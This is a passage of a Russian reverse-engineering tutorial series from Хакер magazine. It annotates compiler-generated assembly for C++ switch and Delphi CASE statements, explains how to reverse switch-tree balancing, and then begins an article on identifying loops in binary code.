; В ECX помещаем значение var_14
                mov     ecx, [rbp+var_14]
; Следующим элегантным образом сравниваем значение var_14 с нулем
                test    ecx, ecx

Команда TEST  не  меняет  значение  операндов,  поэтому  присваиваем
переменной var_18 значение 0х666. Выходит, var_18 — автоматическая
переменная, созданная switch для своей работы, чтобы при изменении
var_14 внутри какой‑либо ветки кода это не повлияло на дальнейший выбор
пути выполнения.


        mov     [rbp+var_18], ecx

Совершаем  прыжок следующей  командой  только  в том  случае,  когда
в результате выполнения предыдущего сравнения флаг ZF стал равен еди‐
нице, а это могло произойти, только когда операнд равен нулю. Но в рас‐
сматриваемом примере это не так, поэтому пропускаем прыжок.


              jz      short loc_401454

Судя по месту назначения этого перехода, код получен трансляцией ветки
case 0: printf("a == 0");.
  По идее, от следующей инструкции можно избавиться. Напрасно ком‐
пилятор ее вставил, поскольку она ничего полезного не делает, а только
занимает место. Посуди сам: $ указывает на текущую позицию в программе,
а команда jmp занимает два байта — получается, она только переводит
выполнение через себя.


              jmp     short $+2


; ------------------------------------------------
loc_40142B: ; CODE XREF: main+29↑j
; В var_18 находится число 0х666, помещаем его в EAX
                mov     eax, [rbp+var_18]
; Уменьшаем EAX на единицу! Что это может значить?
; Никакого вычитания в нашей программе не было!
                sub     eax, 1
; Сохраняем значение разности в переменной var_1C
                mov     [rbp+var_1C], eax

Совершаем следующий переход на основе флага, если ZF == 1, но кто же
его установил? Вспоминаем: SUB — та же CMP, только изменяющая значение
операнда‑приемника. Другими словами, в него помещается разность. Но в
нашем случае ZF не равен единице, так как результат вычитания не равен
нулю. Выходит, этот код получен трансляцией ветки case 1: printf("a ==
1"), что подтверждает просмотр области, куда указывает переход.
   Таким образом, данная конструкция просто завуалированная проверка
EAX на равенство нулю! Ох и хитрый же этот C++Builder-компилятор!


              jz      short loc_401465


; Делаем принудительный шаг вперед, хотя можно было бы обойтись без
дополнительной команды
                jmp     short $+2
; ------------------------------------------------
loc_401438:                             ; CODE XREF: main+36↑j
; В var_18 находится число 0х666, помещаем его в EAX для выполнения
дальнейших вычислений
                mov     eax, [rbp+var_18]

Вычитаем из значения var_18 2, иными словами, исходя из нашего анализа
выше, сравниваем значение переменной var_18 с числом 2. Выходит, этот
код получен трансляцией ветки case 2: printf("a == 2").


              sub     eax, 2
              mov     [rbp+var_20], eax

Переход выполняется, если установлен флаг нуля. А он будет установлен, ког‐
да после вычитания двойки командой SUB в EAX останется ноль, то есть
исходное значение EAX должно быть равно двум. Но этого не случилось.
Поэтому продолжаем выполнение.


              jz      short loc_401476
              jmp     short $+2
; ------------------------------------------------
loc_401445:                             ; CODE XREF: main+43↑j
                mov     eax, [rbp+var_18]

Сравниваем неизменную var_18 с 0x666. Бинго! После вычитания получился
ноль! Следовательно, возводим флаг ZF.


              sub     eax, 666h
              mov     [rbp+var_24], eax

Так как флаг ZF равен единице, совершаем переход к ветке loc_401487, где
происходит вывод строки "a == 666h". Значит, этот код получен после тран‐
сляции ветки case 0x666: printf("a == 666h");.


              jz      short loc_401487

Если бы предыдущий переход не был выполнен, то с помощью следующего
безусловного перехода мы бы сделали прыжок на ветку Default.


              jmp     short loc_401498
; ------------------------------------------------
; Сами ветки
loc_401454:                             ; CODE XREF: main+27↑j
; printf("a == 0");
                lea     rcx, aA0        ; "a == 0"
                call    printf
                mov     [rbp+var_28], eax
                jmp     short loc_4014A7 ; break
; ------------------------------------------------
loc_401465:                             ; CODE XREF: main+34↑j
; printf("a == 1");
                lea     rcx, aA1        ; "a == 1"
                call    printf
                mov     [rbp+var_2C], eax
                jmp     short loc_4014A7 ; break
; ------------------------------------------------
loc_401476:                             ; CODE XREF: main+41↑j
; printf("a == 2");
                lea     rcx, aA2        ; "a == 2"
                call    printf
                mov     [rbp+var_30], eax
                jmp     short loc_4014A7 ; break
; ------------------------------------------------
loc_401487:                             ; CODE XREF: main+50↑j
; printf("a == 666h");
                lea     rcx, aA666h     ; "a == 666h"
                call    printf
                mov     [rbp+var_34], eax
                jmp     short loc_4014A7 ; break
; ------------------------------------------------
loc_401498:                             ; CODE XREF: main+52↑j
; printf("Default");
                lea     rcx, aDefault   ; "Default"
                call    printf
                mov     [rbp+var_38], eax
loc_4014A7: ; конец switch              ; CODE XREF: main+63↑j
                                        ; main+74↑j ...
; Возвращаем 0
                mov     [rbp+var_4], 0
                mov     eax, [rbp+var_4]
; Восстанавливаем стек
                add     rsp, 60h
; Закрываем кадр стека
                pop     rbp
                retn
main            endp

C++Builder проявил большую креативность. Сравнил переменную с нулем он
при помощи инструкции TEST, а для всех остальных случаев вместо инструк‐
ции CMP, как это сделал Visual C++, C++Builder воспользовался командой
вычитания SUB. Оптимизатор на основе своих глубинных знаний посчитал, что
такой код будет быстрее выполняться!
   Вот только нам, хакерам, от этого решения ничуть не легче. Ведь прямая
ретрансляция кода дает конструкцию вроде


if (a == 0) printf("a == 0"); else
if (a == 1) printf("a == 1"); else
if (a == 2) printf("a == 2"); else
if (a == 0x664) printf("a == 666h"); else
printf("Default");

В ней совсем не угадывается оператор switch! Впрочем, почему это не уга‐
дывается? Угадывается, еще как! Где есть длинная цепочка IF — THEN —
ELSE — IF — THEN — ELSE…, там и до switch недалеко! Узнать оператор
множественного выбора будет еще  легче, если изобразить его в виде
логического дерева.
   Другая характерная деталь — case-обработчики, точнее оператор break,
традиционно замыкающий каждый из них. Они‑то и образуют правую полови‐
ну «косички», сходясь все вместе в точке Z. Правда, многие программисты
питают патологическую любовь к case-обработчикам размером в два‑три
экрана, включая в них, помимо всего прочего, и циклы, и ветвления, и даже
вложенные операторы множественного выбора! В результате правая часть
«косички» превращается в непроходимый таежный лес, сквозь который
не проберется и стадо слонопотамов. Но даже если и так, левая часть «косич‐
ки» все равно останется достаточно простой и легко распознаваемой.
  В более сложных деревьях, имеющих большее количество условий — нес‐
колько десятков или сотен (как мы знаем, программисты любят нашпиговы‐
вать операторы switch условиями), компилятор может  вставить допол‐
нительное условие, которого не было в исходной программе. Зачем же он
занимается такой самодеятельностью?
   Когда в программе много условий, процессор совсем запаривается про‐
верять их все (а по закону подлости нужный case будет в самом конце).
Поэтому компилятор с помощью дополнительного условия разделяет дерево
на два или большее количество в зависимости от добавленных условий,
уменьшая его высоту. Вместо одной ветви транслятор построит две, помес‐
тив в левую часть только числа, меньшие определенного значения, а в пра‐
вую — все остальные. Благодаря этому условия из конца дерева будут
перенесены в его начало. Данный метод оптимизации поиска значений
называют методом вилки, но не будем сейчас на нем останавливаться, а луч‐
ше разберем его в разделе «Обрезка длинных деревьев».
   Изменение порядка сравнений — право компилятора. Стандарт ничего
об этом не говорит, и каждая реализация вольна поступать так, как ей заб‐
лагорассудится. Другое дело — case-обработчики (то есть тот код, которому
case передает управление в случае истинности отношения). Они обязаны
располагаться так, как были объявлены в программе, поскольку при отсутс‐
твии  закрывающего  оператора break они  должны  выполняться  строго
в задуманном программистом  порядке, хотя эта возможность  языка C
используется крайне редко.
   Таким образом, идентификация оператора switch не сильно усложняется:
если после уничтожения узлового гнезда и прививки правой ветки к левой
(или наоборот) мы получаем эквивалентное дерево и это дерево образует
характерную  «косичку», мы имеем дело с  оператором  множественного
выбора или его аналогом.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ

  ФУНДАМЕНТАЛЬНЫЕ
  ОСНОВЫ ХАКЕРСТВА
                 РАЗБИРАЕМ САМОДЕЯТЕЛЬНОСТЬ
               КОМПИЛЯТОРОВ ПРИ ТРАНСЛЯЦИИ
                            ОПЕРАТОРА ВЫБОРА





ОТЛИЧИЯ SWITCH ОТ ОПЕРАТОРА CASE ЯЗЫКА PASCAL
Оператор CASE языка Pascal практически идентичен своему С‑собрату —
оператору switch, хотя и близнецами их не назовешь: CASE выгодно отли‐
чается поддержкой наборов и диапазонов значений.
   Если обработку наборов можно реализовать и через switch, правда
не так элегантно, как на Pascal (смотри следующий листинг), то проверить
вхождение значения в диапазон на C получится исключительно с помощью
конструкции IF — THEN — ELSE. Зато в Pascal каждый case-обработчик при‐
нудительно завершается неявным break, а С‑программист волен ставить
(или не ставить) его по своему усмотрению.





                        Сравнение case со switch

Однако оба языка накладывают жесткое ограничение на выбор сравнива‐
емой переменной: она должна принадлежать к численному типу, а все
наборы  (диапазоны)  значений  представлять собой  константы или  кон‐
стантные выражения, вычисляемые на  стадии компиляции.  Подстановка
переменных или вызовов функций не допускается.
   Любопытно было бы посмотреть, как Pascal транслирует проверку диапа‐
зонов, и сравнить его с компиляторами языка C. Рассмотрим следующий
пример:


program many_cases_d;


{$APPTYPE CONSOLE}


{$R *.res}


uses
  System.SysUtils;


var
a : LongInt;
begin
a := 6;
  case a of
      2 : WriteLn('a == 2');
      4, 6 : WriteLn('a == 4 | 6 ');
      10..100 : WriteLn('a == [10,100]');
  end;
end.

Результат его компиляции компилятором Delphi 10.4 должен выглядеть так:


            public _ZN12Many_cases_d14initializationEv


_ZN12Many_cases_d14initializationEv proc near
                                        ; DATA XREF: HEADER:
0000000000400128↑o
                                        ; .pdata:0000000000448328↓o
; __unwind { //
_ZN6System23_DelphiExceptionHandlerEPNS_16TExceptionRecordEyPvS2_
; Открываем кадр стека
                push    rbp
; Резервируем 0х20 байт в стеке
                sub     rsp, 20h
                mov     rbp, rsp
                mov     rax, cs:off_432120
; В RAX помещаем значение 1
                mov     byte ptr [rax], 1
                nop
; В RCX помещаем указатель на область памяти размером в 0х12 (18)
байт
                lea     rcx, qword_429088
; Вызываем процедуру для инициализации исполнительного модуля
операционной среды
; В качестве параметра передается указатель на область памяти
                call    _ZN7Sysinit8_InitExeEPv
; Значение 0х6 помещается в память, все указывает на то, что это
наша переменная a...
                mov     cs:_ZN12Many_cases_d1aE, 6
; Затем значение перемещается в регистр
                mov     eax, cs:_ZN12Many_cases_d1aE
; Вычитаем из EAX значение 0х2
                sub     eax, 2
; Проверяем на равенство нулю
                test    eax, eax
; Если флаг нуля возведен, делаем переход на ветку, где выводится "a
== 0"
; В нашем случае продолжаем выполнение
                jz      short loc_428F8E
; Еще вычитаем из EAX 0x2
                sub     eax, 2
; Снова проверяем на равенство нулю
                test    eax, eax

Если флаг нуля возведен, делаем переход на ветку, где выводится "a == 4 |
6 ", это похоже на наш случай, но предыдущий test не возвел флаг ZF, так
как в результате вычитания получилось число 2.


              jz      short loc_428FB0
; Снова такое же вычитание...
                sub     eax, 2
; ...и проверка
                test    eax, eax

На этот раз результат разности удовлетворяет условию перехода, поэтому
совершаем прыжок на ту же самую ветку, на которую был переход выше, где
выводится "a == 4 | 6 "!


                jz      short loc_428FB0
; Предположим, в параллельной вселенной выполнение продолжилось
; Тогда после нахождения очередной разности
                sub     eax, 4
; проверяем EAX
                cmp     eax, 5Bh ; '['

Если значение в нем больше или равно (то есть не меньше) 0х5B (91), зна‐
чит, все условные переходы прошли лесом и мы совершаем прыжок в конец
CASE.


              jnb     short loc_428FF2 ; Эта метка играет роль
оператора break

Если предыдущий переход не  сработал,  значит, наше  число  попадает
в диапазон, поэтому переходим на следующую метку, чтобы вывести соот‐
ветствующую надпись.


              jmp     short loc_428FD2
; ------------------------------------------------
loc_428F8E: ; CODE XREF: _ZN12Many_cases_d14initializationEv+34↑j
                mov     rcx, cs:off_431F40
                lea     rdx, aA2        ; "a == 2"
                call
_ZN6System14_Write0UStringERNS_8TTextRecENS_13UnicodeStringE
                mov     rcx, rax
                call    _ZN6System8_WriteLnERNS_8TTextRecE
                call    _ZN6System8__IOTestEv
                jmp     short loc_428FF2 ; break
; ------------------------------------------------
loc_428FB0: ; CODE XREF: _ZN12Many_cases_d14initializationEv+3B↑j
            ; _ZN12Many_cases_d14initializationEv+42↑j
                mov     rcx, cs:off_431F40
                lea     rdx, aA46       ; "a == 4 | 6 "
                call
_ZN6System14_Write0UStringERNS_8TTextRecENS_13UnicodeStringE
                mov     rcx, rax
                call    _ZN6System8_WriteLnERNS_8TTextRecE
                call    _ZN6System8__IOTestEv
                jmp     short loc_428FF2 ; break
; ------------------------------------------------
loc_428FD2: ; CODE XREF: _ZN12Many_cases_d14initializationEv+4C↑j
                mov     rcx, cs:off_431F40
                lea     rdx, aA10100    ; "a == [10,100]"
                call
_ZN6System14_Write0UStringERNS_8TTextRecENS_13UnicodeStringE
                mov     rcx, rax
                call    _ZN6System8_WriteLnERNS_8TTextRecE
                call    _ZN6System8__IOTestEv
loc_428FF2: ; CODE XREF: _ZN12Many_cases_d14initializationEv+4A↑j
            ; _ZN12Many_cases_d14initializationEv+6E↑j ...
; Конец CASE
; Процедура останавливает выполнение приложения
                call    _ZN6System6_Halt0Ev
; ------------------------------------------------
; Если никакое исключение не возникло, делаем безусловный прыжок в
обход перехватчика исключения
                jmp     short loc_429001
; ------------------------------------------------
                db 2 dup(90h)
; ------------------------------------------------
; Если возникла исключительная ситуация, ловим ее, чтобы не дать ей
вмешаться в работу операционной системы
                call    _ZN6System19_UnhandledExceptionEv
; ------------------------------------------------
                db 90h
; ------------------------------------------------
loc_429001: ; CODE XREF: _ZN12Many_cases_d14initializationEv+B7↑j
; Конец приложения:
; восстанавливаем стек
                lea     rsp, [rbp+20h]
; и закрываем кадр стека
                pop     rbp
                retn
; } // starts at 428F40
_ZN12Many_cases_d14initializationEv endp

Почему же компилятор, чтобы найти попадание в диапазон, в качестве вер‐
хнего предела взял не 0х64 (100), как прописано в исходном коде, а 0х5B (
91)? Дело в том, что, учитывая все предыдущие вычитания, это будет
наибольшее из возможных значений.
   Условные операторы, в частности операторы выбора, предоставляют ком‐
пилятору широчайший творческий простор для генерации двоичного кода!
К примеру, если взглянуть на исходный текст нашей программы, никакого
вычитания там и в помине не было!


ОБРЕЗКА ДЛИННЫХ ДЕРЕВЬЕВ
В некоторых (хотя и редких) случаях операторы множественного выбора
содержат сотни (а то и тысячи) наборов значений, и если решать задачу срав‐
нения в лоб, то высота логического дерева окажется гигантской до неп‐
риличия, а его прохождение займет весьма длительное время, что не лучшим
образом скажется на производительности программы.
  Но задумайся: чем,  собственно, занимается оператор switch? Если
отвлечься от устоявшего мнения, что switch дает специальный способ
выбора одного из многих вариантов (который заключается в проверке сов‐
падения значения данного выражения с одной из заданных констант и соот‐
ветствующем ветвлении), то можно сказать, что switch — оператор «поиска
соответствующего значения». В таком случае каноническое switch-дерево
представляет собой тривиальный алгоритм «последовательного поиска» —
самый неэффективный алгоритм из всех.
   Пусть, например, исходный текст программы выглядел так:


switch (a)
{
case 98 : …;
case 4 : …;
case 3 : …;
case 9 : …;
case 22 : …;
case 0 : …;
case 11 : …;
case 666 : …;
case 096 : …;
case 777 : …;
case 7 : …;
}

Тогда соответствующее ему неоптимизированное логическое дерево будет
достигать в высоту одиннадцать гнезд.





                       Логическое дерево до утрамбовки

Причем на левой ветке корневого гнезда окажется аж десять других гнезд,
а на правой вообще ни одного (только соответствующий ему case-обработ‐
чик).
   Исправить «перекос» можно, разрезав одну ветку на две и привив обра‐
зовавшиеся половинки к новому гнезду, которое содержит условие, опре‐
деляющее, в какой из веток следует искать сравниваемую переменную. Нап‐
ример, левая ветка может содержать гнезда с четными значениями, а пра‐
вая — с нечетными. Но это плохой критерий: четных и нечетных значений ред‐
ко бывает поровну, и вновь образуется перекос.
   Гораздо надежнее поступить так: берем наименьшее из всех значений
и бросаем его в кучу А, затем берем наибольшее из всех значений и бросаем
его в кучу B. Так повторяем до тех пор, пока не рассортируем все имеющиеся
значения.
   Поскольку оператор множественного выбора требует уникальности каж‐
дого значения, то есть каждое число может встречаться в наборе (диапазоне)
значений лишь однажды, легко показать, что:
 • в обеих кучах будет содержаться равное количество чисел (в худшем слу‐
   чае — в одной куче окажется на число больше);
 • все числа кучи A меньше наименьшего из чисел кучи B.

Следовательно, достаточно выполнить только одно сравнение, чтобы опре‐
делить, в какой из двух куч следует искать сравниваемые значения.
                                   N+1




                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ​   Высота нового дерева будет равна  +1, где N — количество гнезд ста‐                               2
рого дерева. Действительно, мы же делим ветвь дерева надвое и добавляем
                      N




                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ​новое гнездо — отсюда и берется  и +1, а N +1 необходимо для округления                           2
результата деления в большую сторону. К примеру, если высота неоптимизи‐
рованного дерева достигала 100 гнезд, то теперь она уменьшилась до 51.
   Что? Говоришь, 51 все равно много? А что нам мешает разбить каждую
из двух ветвей еще на две? Это уменьшит высоту дерева до 27 гнезд! Ана‐
логично последующее уплотнение даст 16 → 12 → 11 → 9 → 8... и все! Более
плотная упаковка дерева невозможна (подумай почему, на худой конец —
построй само дерево). Но согласись, восемь гнезд — это не сто! Полное
прохождение оптимизированного дерева  потребует менее девяти срав‐
нений!
   «Трамбовать» логические деревья оператора множественного выбора
умеют практически все компиляторы, даже неоптимизирующие. Это увеличи‐
вает производительность, но затрудняет анализ откомпилированной прог‐
раммы. Взгляни еще раз на рисунок «Логическое дерево до утрамбовки» —
несбалансированное дерево наглядно и интуитивно понятно. После балан‐
сировки же (схема «до утрамбовки» выше) — в нем сам Тигра хвост обломит.





                     Логическое дерево после утрамбовки

К  счастью,  балансировка  дерева  допускает  эффективное  обращение.
Но прежде чем засучить рукава и приготовиться к лазанью по деревьям (а
Тигра лазает по деревьям лучше всех!), введем понятие балансировочного
узла.
   Балансировочный узел не изменяет логики работы двоичного дерева
и является факультативным узлом, единственная функция которого — уко‐
рачивание длины ветвей. Балансировочный узел без потери функциональ‐
ности дерева может быть замещен любой из своих ветвей. Причем каждая
ветвь балансировочного узла должна содержать одно или больше гнезд.
   Рассуждая от противного: если все узлы логического дерева, правая ветка
которых содержит одно или более гнезд, могут быть замещены этой самой
правой веткой без потери функциональности дерева, то данная конструкция
представляет собой оператор switch. Почему именно правая ветка? Так ведь
оператор множественного выбора в развернутом состоянии представляет
цепочку гнезд, соединенных левыми ветвями друг с другом, а на правых дер‐
жатся case-обработчики. Вот мы и пытаемся подцепить все правые гнезда
на левую ветвь. Если это удается, мы имеем дело с оператором множествен‐
ного выбора, а нет — с чем‑то другим.
   Рассмотрим обращение балансировки на примере следующего дерева.





         Обращение балансировки логического дерева — шаг 1

Двигаясь от левой нижней ветви, мы будем продолжать взбираться на дерево
до тех пор, пока не встретим узел, держащий на своей правой ветви одно
или более гнезд. В нашем случае это узел (а > 5). Смотри: если данный узел
заменить гнездами (а == 7) и (а == 9), функциональность дерева не нарушит‐
ся!





         Обращение балансировки логического дерева — шаг 2

Аналогично узел (а > 10) может быть безболезненно заменен гнездами (а >
96), (а == 96), (а == 22) и (а == 11), а узел (а > 96), в свою очередь, гнездами
(а == 98), (а == 666) и (а == 777). В конце концов образуется классическое
switch-дерево, в котором оператор множественного выбора распознается
с первого взгляда.





         Обращение балансировки логического дерева — шаг 3


Сложные случаи балансировки, или оптимизирующая
балансировка
Для уменьшения высоты «утрамбовываемого» дерева хитрые трансляторы
стремятся замещать гнезда балансировочными узлами. Рассмотрим сле‐
дующий пример.





                        Хитрый случай балансировки

Для уменьшения высоты дерева транслятор разбивает его на две полови‐
ны — в левую идут гнезда со значениями, меньшими единицы или равными
ей, а в правую — все остальные. Казалось бы, на правой ветке узла (а > 1)
должно висеть гнездо (а == 2), ан нет! Здесь мы видим узел (а > 2), к левой
ветке которого прицеплен case-обработчик :2! А что, вполне логично: если
(а>1) и !(а>2), то а == 2!
   Легко видеть, что узел (а > 2) жестко связан с узлом (а > 1) и работает
на пару с последним. Нельзя выкинуть один из них, не нарушив работос‐
пособности другого! Обратить балансировку дерева по описанному выше
алгоритму без нарушения его функциональности невозможно. Отсюда может
создаться мнение, что мы имеем дело вовсе не с оператором множествен‐
ного выбора, а с чем‑то другим.
   Чтобы развеять это заблуждение, придется предпринять ряд дополнитель‐
ных шагов. Первое — у switch-дерева все case-обработчики всегда находятся
на правой ветви. Смотрим, можно ли трансформировать наше дерево так,
чтобы case-обработчик 2 оказался на левой ветви балансировочного узла?
Да, можно: изменив (а > 2) на (а < 3) и поменяв ветви местами (другими сло‐
вами, выполнив инверсию). Второе — все гнезда switch-дерева содержат
в себе условия равенства. Смотрим, можем ли мы заменить неравенство (а <
3) аналогичным ему равенством? Конечно же, можем — (а == 2)!
   После всех этих преобразований обращение балансировки дерева уда‐
ется выполнить без труда!


Ветвления в case-обработчиках
В реальной жизни case-обработчики прямо‑таки кишат ветвлениями, цик‐
лами и прочими условными переходами всех мастей. Как следствие —
логическое дерево приобретает вид, ничуть не напоминающий оператор
множественного выбора, а скорее смахивающий на заросли чертополоха.
Понятное дело, идентифицировав case-обработчики, мы могли бы решить эту
проблему, но как их идентифицировать?
   Очень просто: за редкими клиническими исключениями, case-обработ‐
чики содержат ветвления относительно сравниваемой переменной. Действи‐
тельно, конструкции switch(a) .... case 666 : if (а == 666) ...
или switch(a) ... case 666 : if (a > 66) ... абсолютно лишены
смысла. Таким образом, мы можем смело удалить из логического дерева все
гнезда с условиями, касающимися сравниваемой переменной (переменной
корневого гнезда).
   Хорошо, а если программист в порыве собственной глупости или стрем‐
лении затруднить анализ программы впаяет в case-обработчики ветвления
относительно сравниваемой переменной? Оказывается, это ничуть не зат‐
руднит анализ! Впаянные ветвления элементарно распознаются и обрезают‐
ся либо как избыточные, либо как никогда не выполняющиеся. Например,
если к правой ветке гнезда (a == 3) прицепить гнездо (a > 0) — его можно
удалить, как не несущее в себе никакой информации. Если же к правой ветке
того же самого гнезда прицепить гнездо (a ==  2), его можно удалить,
как никогда не выполняющееся: если a == 3, то заведомо a != 2!


ИТОГИ
Сперва мы разобрали, чем конструкция оператора выбора switch — case —
break отличается от обычного условного оператора if — then —  else,
как различаются их двоичные представления. Рассмотрели, какой бинарный
код создают два самых популярных компилятора C++ на основе одной и той
же программы, внутри которой присутствует оператор выбора. Убедились,
что разница значительна.
   Далее наше внимание захватил аналог оператора выбора из языка Pascal.
Его рассмотрение с точки зрения программиста выявило бесспорное пре‐
восходство над C++-аналогом, однако, с точки зрения ассемблерщика, код,
подготовленный Delphi-компилятором, особо не отличается от кода того же
C++Builder.
   Когда оператор условного выбора имеет разумное количество исполня‐
емых веток, разобраться в условиях и вытекающих из них действий не сос‐
тавляет особого труда, загадка решается с использованием головного мозга
без применения дополнительных инструментов. Тем не менее, если в опе‐
раторе выбора содержатся десятки условий с ветками, приходится чертить
логическое дерево. Как мы обсуждали в одной из прошлых статей, для пос‐
троения логического дерева можно написать чертежную программу или вос‐
пользоваться графопостроителем из состава IDA Pro в том случае, если она
есть среди твоего хакерского инструментария.
  Но если дерево состоит из сотен или тысяч веток, а программисты
с бодуна всякое могут написать, никакого мыслительного процесса для ана‐
лиза такого кода не хватит. И приходится снова прибегать к помощи логичес‐
ких деревьев. А если дерево получится заросшим, вскарабкаться на него
будет очень сложно. Поэтому его придется обрезать, сокращать, исключать
не имеющие смысла узлы. Эти шаги мы подробно рассмотрели в третьем
разделе статьи.
  В следующей статье мы разберем устройство циклов — еще одного край‐
не важного механизма всех языков программирования.
ВЗЛОМ

  ФУНДАМЕНТАЛЬНЫЕ
          ОСНОВЫ
          ХАКЕРСТВА





                                                                    Крис Касперски
                                                                            Известный российский
                                                                                        хакер. Легенда ][, ex-
                                                                               редактор ВЗЛОМа. Также
                                                                               известен под псевдонимами
                                                                        мыщъх, nezumi (яп. 鼠,
                                                                           мышь), n2k, elraton, souriz,
                                                                                                        tikus, muss, farah, jardon,
                                                                               KPNC.

ОПРЕДЕЛЯЕМ ЦИКЛЫ
В ДВОИЧНОМ КОДЕ
ПРОГРАММЫ
                                                            Юрий Язев
                                                                      Широко известен под
                                                                          псевдонимом yurembo.
                                                                            Программист, разработчик
                                                                                  видеоигр, независимый
                                                                                исследователь. Старый автор
                                                                                журнала «Хакер».
                                                                                    yazevsoft@gmail.com





В сегодняшней статье мы изучим все типы циклов, которые
могут  встретиться в языках программирования высокого
уровня. Увидим, какие способы есть у компилятора для отра‐
жения их в двоичном виде. Разберем плюсы и минусы каж‐
дого. Кроме того, мы узнаем, как перемалывают циклы раз‐
личные трансляторы и что получается на выходе у оптимизи‐
рующих и неоптимизирующих компиляторов.


Фундаментальные основы хакерства
Пятнадцать лет назад эпический труд Криса Касперски «Фундаментальные
основы хакерства» был настольной книгой каждого начинающего исследова‐
теля в области компьютерной безопасности. Однако время идет, и знания,
опубликованные Крисом, теряют актуальность. Редакторы «Хакера» попыта‐
лись обновить этот объемный труд и перенести его из времен Windows
2000 и Visual Studio 6.0 во времена Windows 10 и Visual Studio 2019.
   Ссылки на другие статьи из этого цикла ищи на странице автора.


Циклы — единственная (за исключением неприличного GOTO) конструкция
языков высокого уровня, имеющая ссылку «назад», то есть в область младших
адресов. Все остальные виды ветвлений — будь то IF —  THEN  —  ELSE
или оператор множественного выбора SWITCH — всегда направлены «вниз»,
в область старших адресов. Вследствие этого изображающее цикл логичес‐
кое дерево настолько характерно, что легко опознается с первого взгляда.
   Существуют три основных типа циклов.
 1. Циклы с условием в начале.





 2. Циклы с условием в конце.





 3. Циклы с условием в середине.





Комбинированные циклы имеют несколько условий в разных местах, нап‐
ример в начале и конце одновременно. В свою очередь, условия бывают двух
типов: условия завершения цикла и условия продолжения цикла.
  В  первом  случае, если  условие  завершения  истинно,  выполняется
переход в конец цикла, иначе он продолжается. Во втором, если условие
продолжения цикла ложно, выполняется переход в конец цикла, в противном
случае он продолжается. Легко показать, что условия продолжения цикла
представляют собой инвертированные условия завершения.
   Таким образом, со стороны транслятора вполне достаточно поддержки
условий одного типа. И действительно, операторы циклов while, do и for
языка С/C++ работают исключительно с условиями продолжения цикла. Опе‐
ратор while языка Delphi также работает с условием продолжения, и исклю‐
чение составляет один лишь repeat-until, ожидающий условие завершения
цикла.


ЦИКЛЫ С УСЛОВИЯМИ В НАЧАЛЕ
Их также называют циклами с предусловием. В языках С/C++ и Delphi под‐
держка  циклов с  предусловием  обеспечивается  оператором while  (
условие), где условие — это условие продолжения цикла. То есть цикл while
(a  <  10)  a++; выполняется до тех пор, пока условие (a>10) остается
истинным. Однако транслятор при желании может инвертировать условие
продолжения  цикла  на  условие  его  завершения. На  платформе  Intel
80x86 такой трюк экономит от одной до двух машинных команд.
   Обрати внимание: ниже приведен цикл с условием завершения цикла.





А далее — с условием продолжения цикла.





Как видно на картинках, цикл с условием завершения на одну команду короче!
Поэтому практически все компиляторы (даже неоптимизирующие) всегда
генерируют первый вариант. А некоторые особо одаренные даже умеют
превращать циклы с предусловием в еще более эффективные циклы с пос‐
тусловием (см. пункт «Циклы с условием в конце»).
   Цикл с условием завершения не может быть непосредственно отображен
на оператор while. Кстати, об этом часто забывают начинающие, допуская
ошибку «что вижу, то пишу»: while (a >= 10) a++. С таким условием цикл
вообще не выполнится ни разу! Но как выполнить инверсию условия и при
этом гарантированно не ошибиться? Казалось бы, что может быть проще,
а вот попросите знакомого хакера назвать операцию, обратную «больше».
Очень может быть (даже наверняка!), что ответом будет... «меньше». А вот
и нет, правильный ответ «меньше или равно». Полный перечень обратных
операций отношений можно найти в следующей таблице.





ЦИКЛЫ С УСЛОВИЕМ В КОНЦЕ
Их также называют циклами с постусловием. В языке С/C++ поддержка цик‐
лов с постусловием обеспечивается парой операторов do … while, а в языке
Delphi — repeat … until. Циклы с постусловием без каких‑либо проблем
непосредственно отображаются с языка высокого уровня на машинный код
и наоборот. То есть, в отличие от циклов с предусловием, инверсии условия
не происходит.
   Например, do a++; while (a<10); в общем случае компилируется в сле‐
дующий код (обрати внимание: в переходе использовалась та же самая опе‐
рация отношения, что и в исходном  цикле. Красота, и никаких ошибок
при декомпиляции!).





Сравним код цикла с постусловием и код цикла с предусловием. Не правда
ли, цикл с условием в конце компактнее и быстрее? Некоторые компиляторы
(например, Microsoft Visual C++) умеют транслировать циклы с предусловием
в циклы с постусловием. На первый взгляд, это вопиющая самодеятельность
компилятора — если программист хочет проверять условие в начале, то
какое право имеет транслятор ставить его в конце?
  На самом же деле разница между «до» и «после» не столь значительна.
Если компилятор уверен, что цикл выполняется хотя бы один раз, то он впра‐
ве выполнять проверку когда угодно. Разумеется, при этом необходимо нес‐
колько скорректировать условие проверки: while (a<b) не эквивалентно do
... while (a<b), так как в первом случае при (a == b) уже происходит
выход из цикла, а во втором цикл выполняет еще одну итерацию. Однако этой
беде легко помочь: увеличим а на единицу (do  ...  while  ((a+1)<b))
или вычтем эту единицу из b (do ... while (ab-1))), и... теперь все будет
работать!
   Спрашивается: и на кой все эти извращения, значительно раздувающие
код? Дело в том, что блок статического предсказания направления ветвлений
процессоров Pentium и всех последующих моделей оптимизирован именно
под переходы, направленные назад, то есть в область младших адресов.
Поэтому циклы с постусловием должны выполняться несколько быстрее ана‐
логичных им циклов с предусловием.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ

  ФУНДАМЕНТАЛЬНЫЕ
  ОСНОВЫ ХАКЕРСТВА
            ОПРЕДЕЛЯЕМ ЦИКЛЫ В ДВОИЧНОМ КОДЕ
                               ПРОГРАММЫ





ЦИКЛЫ СО СЧЕТЧИКОМ
Циклы со счетчиком (for) не являются самостоятельным типом циклов,
а представляют собой всего лишь синтаксическую разновидность циклов
с предусловием. В самом деле, for (a = 0; a < 10; a++) в первом приб‐
лижении то же самое, что и


a = 0;
while (a < 10) {
  ...
  a++;
}

Однако результаты компиляции двух этих конструкций необязательно будут
идентичны!
   Оптимизирующие компиляторы (да и значительная часть неоптимизи‐
рующих)  поступают  хитрее,  передавая  после  инициализации  перемен‐
ной‑счетчика управление на команду проверки условия выхода из цикла.
Образовавшаяся конструкция, во‑первых, характерна и при анализе прог‐
раммы — она сразу бросается в глаза, — а во‑вторых, не может быть непос‐
редственно отображена на циклы while языка высокого уровня.





Непосредственный прыжок вниз может быть результатом компиляции и цикла
